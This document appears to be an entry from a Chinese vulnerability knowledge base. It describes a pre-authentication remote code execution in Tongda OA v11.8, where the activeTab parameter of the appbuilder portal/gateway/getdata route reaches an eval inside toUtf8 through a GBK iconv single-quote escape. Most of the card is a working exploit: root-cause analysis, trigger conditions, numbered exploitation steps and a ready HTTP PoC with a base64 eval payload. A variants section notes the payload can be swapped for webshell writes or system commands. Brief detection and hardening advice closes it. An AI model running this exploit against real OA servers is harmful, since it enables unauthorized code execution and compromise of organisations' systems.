---
id: web-php-rce-tongda-oa-appbuilder-getdata-portal-eval
title: 通达OA v11.8 appbuilder portal/gateway/getdata 前台命令执行：免登录 gateway 路由 + comtype=1 组件 GetData 进入 toUtf8 的 iconv eval 单引号逃逸
type: scenario
domain: web
path: web/php/rce
technique: tongda-oa-appbuilder-getdata-portal-eval-iconv
tags:
- php
- oa
- tongda
- yii
- unauth
- rce
- eval
- iconv
- encoding-bypass
cve: []
severity: critical
confidence: high
status: verified
affected_versions: v11.8
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V628
  verified_at: '2026-11-12T23:38:13+08:00'
  notes: 已对照原文全文与19张截图核对：图12 web/index.php LOGIN_UID空分支；图13 GatewayController约2016行GetData(,,...);图14 PortalComponent::GetData findOne(id)与(string)comtype;图15 mysql查询portal_component id=19→comtype=1、id=3→0;图16 data_analysis调用;图17 comtype 0/1/2分别走function/free/website_components并get_data;图18 AppUtils::toUtf8(dataBack);图19 toUtf8在QuickConvertCharset下iconv(GBK,UTF-8,var_export(...))+eval。PoC activeTab=%E5%27%19,1=>eval(base64_decode(...)))%3B/*与原文一致。原文'在v11.8版本下还存在一个前台任意命令执行漏洞'明确版本，keep affected_versions=v11.8。修正：原触发条件混入api.ali链的裸常量说法，改为PHP 7.x本机验证、PHP 8控制字节未验证。dedup recommendation=new，候选均为不同产品/技术链；与api.ali卡同版本不同入口与不同sink(toUtf8)，互引变体不重复。19张图全部读取无失败。
url: /docs/web/php/rce/web-php-rce-tongda-oa-appbuilder-getdata-portal-eval/
draft: false
kb_aliases:
- getdata
- activeTab
- GatewayController
- PortalComponent
- AppCarouselimage
- toUtf8
- QuickConvertCharset
- 通达OA appbuilder 前台 RCE
---

## 一句话结论

通达OA v11.8 的 appbuilder（Yii）入口 `web/index.php` 在未登录时只拦截 `/portal/gateway/saveportal` 与含 `edit` 的 URL，匿名即可访问 `/general/appbuilder/web/portal/gateway/getdata`；传 `module=Carouselimage`、`id=19`（`portal_component` 表中 comtype=1）让 `PortalComponent::GetData()` 走到 `free_components/AppCarouselimage::get_data()`，用户可控的 `activeTab` 原样进入返回数组，随后 `AppUtils::toUtf8()` 对数组做 `var_export` + `iconv("GBK","UTF-8")` 再 `eval`，`0xE5` 与转义反斜杠 `0x5C` 组成合法 GBK 字符吞掉转义，单引号逃逸执行任意 PHP 代码。

## 原理

- **鉴权缺陷在入口**：`web/index.php` 加载 `config/web.php` 后判断 `$config["params"]["LOGIN_UID"]` 为空，走未登录分支：取 `REQUEST_URI`，若 URL 含 `/portal/` 且含 `/gateway/`、不含 `/gateway/saveportal`、整条 URL 不含 `edit`，则不做登录校验直接放行；其余情况（含 `/appdata/doprint` 的 CSRF 分支不满足时）一律重定向 `/index.php`。因此 `/portal/gateway/` 下除 `saveportal` 外的所有 action 都是前台可达，`getdata` 就在其中。
- **从路由到组件**：`modules/portal/controllers/GatewayController.php` 在约 2016 行 `new modules\portal\models\PortalComponent()` 并调用 `GetData($id, $module, $activeTab, ...)`；`PortalComponent::GetData()` 用 `$id` 做 `findOne(array("id"=>$id))` 查 `portal_component` 表，取 `source/attribute/comtype` 等字段组成 `$this_array`，其中 `$comtype = (string)$data->comtype`；再调用 `Yii::$app->getModule("portal")->designComponent->data_analysis($module, $this_array)`。
- **comtype 决定落地类**：`AppDesignComponents.php::data_analysis()` 里 `$classname = "App".ucfirst($module)`，按 `$thisarray["comtype"]` 选择组件目录——`"0"` 走 `models\function_components\`，`"1"` 走 `models\free_components\`，`"2"` 走 `models\website_components\`，然后 `new` 对应类并调用 `get_data($thisarray)`。PoC 用 `module=Carouselimage`、`id=19`（原文数据库截图 `select comtype from portal_component where id=19` 结果为 1），进入 `free_components/AppCarouselimage.php::get_data()`；该函数对 `activeTab` 不做任何过滤。
- **sink 在 toUtf8**：`GatewayController` 拿到 `GetData()` 返回数组后执行 `AppUtils::toUtf8($this->dataBack)`；`toUtf8()` 在 `Yii::$app->params["QuickConvertCharset"]` 为真、`$value` 是数组且不含 `pattern` 键时，`$_con = AppUtils::iconv("GBK","UTF-8", AppUtils::var_export($value, true).";")`，随后 `eval("return ".$_con)`。
- **为什么单引号能逃逸**：PoC 的 `activeTab` 以字节 `0xE5` 紧贴单引号（URL 中 `%E5%27...`），该串作为数组值进入 `var_export` 后，值里的单引号被转义成 `...E5 5C 27...`；`iconv("GBK","UTF-8")` 按 GBK 解码时 `E5 5C` 组成一个合法 GBK 字符（`0x5C` 是合法尾字节），转义反斜杠被吞掉，`0x27` 单引号裸露并提前闭合字符串；后面的 `,1=>eval(base64_decode("..."))` 因此在 `array(...)` 字面量中成为合法元素并执行，末尾 `/*` 注释掉 var_export 的剩余语法。本机 PHP 7.3 用同字节复现成功（输出 `vuln_test`；载荷中的 `0x19` 控制字节只触发 “Unexpected character” Warning 后被跳过，不影响执行）。
- 与 api.ali.php 链的 `iconv("UTF-8","GBK")` + `錦` 方向相反：这里走 `GBK→UTF-8`，用 `0xE5` 引导；两者共同原理都是“多字节编码把 ASCII 反斜杠并进某个字符”，令 `var_export` 的 `\'` 转义失效。

## 触发条件

- 目标为通达OA v11.8（原文标注影响版本）。
- appbuilder 组件启用，且 `QuickConvertCharset` 参数开启（原文环境默认命中该分支）。
- 未登录可访问 `/general/appbuilder/web/portal/gateway/getdata`；URL 不能含 `edit`，且不能是 `saveportal`。
- `portal_component` 表中存在 `comtype=1` 的组件 id（如默认 `id=19`），`module` 用对应组件名（如 `Carouselimage`）。
- PHP 7.x 环境（本机 PHP 7.3 以同字节复现；PHP 8 对 eval 源码中 `0x19` 等控制字节的处理可能不同，未验证）。

## 利用步骤

1. 确认入口可访问：匿名请求 `/general/appbuilder/web/portal/gateway/getdata`，观察是否未被重定向到 `/index.php`。
2. 构造 `activeTab`：以 `0xE5` + `'` 开头，后接 `,1=>eval(base64_decode("<base64 PHP 代码>")));/*`，例如 `\xE5\x27\x19,1=>eval(base64_decode("ZWNobyB2dWxuX3Rlc3Q7")));/*`。
3. 发送 `GET /general/appbuilder/web/portal/gateway/getdata?activeTab=<urlencode>&id=19&module=Carouselimage`。
4. 观察响应/回显：eval 中的代码被执行；把 base64 换成写 WebShell、系统命令或读文件即可。

## PoC

```http
GET /general/appbuilder/web/portal/gateway/getdata?activeTab=%E5%27%19,1%3D%3Eeval(base64_decode(%22ZWNobyB2dWxuX3Rlc3Q7%22)))%3B/*&id=19&module=Carouselimage HTTP/1.1
Host: <target>
```

其中 `ZWNobyB2dWxuX3Rlc3Q7` base64 解码为 `echo vuln_test;`。

## 变体与关联

- 同版本的 [[web-php-rce-tongda-oa-api-ali-upload-work-php-json-eval-iconv]] 是同一编码逃逸思想在 `work.php`/`backDataAnalysis` 上的应用，方向为 `UTF-8→GBK` + `錦`。
- 其它调用 `AppUtils::toUtf8()` 的 appbuilder 接口若 `activeTab` 等参数可控，同样可复用该 sink；`module`/`id` 只需选到 `comtype=1`（或 0/2）的组件。
- base64 载荷可替换为任意 PHP，如 `file_put_contents` 写 WebShell、`system` 执行命令。
- 关联：[[web-php-rce-eval-expression-closing-paren-injection]]（eval 拼接闭合注入的通用思路）。

## 检测与防御

- 检测：监控 `/portal/gateway/getdata` 等免登录 gateway 请求，尤其是 `activeTab` 含非 UTF-8 字节、`%E5%27`、`eval(`、`base64_decode` 等特征；关注 `toUtf8` 中 eval 的调用告警。
- 防御：升级修复版本；把 `web/index.php` 的未登录白名单收紧到必要资源，`/portal/gateway/*` 全部强制鉴权；删除 `toUtf8()` 里的 eval，改为安全的 UTF-8 转换；关闭 `QuickConvertCharset`；对 `activeTab` 等参数做字符白名单与长度限制。
- 加固：WAF 拦截含控制字节和 PHP 代码关键字的请求参数；审计 Yii 应用中所有 `eval`/`iconv` 组合的编码转换点。
